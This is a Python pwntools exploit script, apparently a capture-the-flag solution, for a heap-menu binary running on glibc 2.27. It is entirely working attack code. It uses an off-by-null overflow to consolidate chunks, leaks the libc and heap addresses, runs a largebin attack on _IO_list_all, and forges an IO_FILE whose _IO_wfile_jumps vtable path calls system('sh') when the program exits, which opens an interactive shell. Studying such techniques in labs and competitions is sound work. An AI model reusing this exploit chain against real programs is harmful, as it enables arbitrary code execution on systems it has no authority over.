#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./OBN27-16')
#libc = ELF('./libc-2.27.so')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./OBN27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x418) #0 0x250
add(0x418) #1 0x670
add(0x4f0) #2 0xa90

add(0x418) #3 0xf90

add(0x418) #4 0x13b0
add(0x428) #5 0x17d0
add(0x4f0) #6 0x1c00

add(0x418) #7 0x2100

delete(0)
edit(1, 'A'*0x410+p64(0x840)) #off by null 修改chunk2 size
delete(2) #chunk0 1 2合并

add(0x418) #8 use chunk0
show(1)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
_IO_list_all = libcbase + libc.sym['_IO_list_all']
system = libcbase + libc.sym["system"]
pr('libcbase',libcbase)
add(0x418) #9 use chunk1
add(0x4f0) #10 use chunk2

delete(4)
edit(5, 'A'*0x420+p64(0x850)) #off by null 修改chunk6 size
delete(6) #chunk4 5 6合并

add(0x418) #11 use chunk4
add(0x428) #12 use chunk5
add(0x4f0) #13 use chunk6

delete(12)
add(0x430) #14 0x2520,让chunk5 进入 largebin
delete(9) #chunk1放入unsortedbin

show(5)
heapbase = u64(p.recv(24)[-8:].ljust(8, "\x00")) - 0x17d0
pr('heapbase',heapbase)

edit(5, p64(0)*3+p64(_IO_list_all-0x20))
add(0x440) #15 0x2960,chunk1 地址写入 _IO_list_all

#=========================fake_IO_FILE=========================

IO_FILE_addr = heapbase + 0x670
_IO_wdoallocbuf_addr = IO_FILE_addr + 0x130

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base, _wide_data->_IO_write_base = 0
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(1) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end, _wide_data->_IO_buf_base = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr) # _wide_data
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps) # vtable = _IO_wfile_overflow
fake_IO_FILE  = fake_IO_FILE.ljust(0x120,'\x00')

#======================fake_IO_wdoallocbuf==========================

fake_IO_wdoallocbuf  = p64(_IO_wdoallocbuf_addr)
fake_IO_wdoallocbuf  = fake_IO_wdoallocbuf.ljust(0x68, '\x00')
fake_IO_wdoallocbuf += p64(system)

edit(8, 'A'*0x410+"  sh\x00\x00\x00")
payload = fake_IO_FILE + fake_IO_wdoallocbuf
edit(1, payload )
#gdb.attach(p)
#pause()

p.sendlineafter(':','5') # 触发exit()
p.interactive()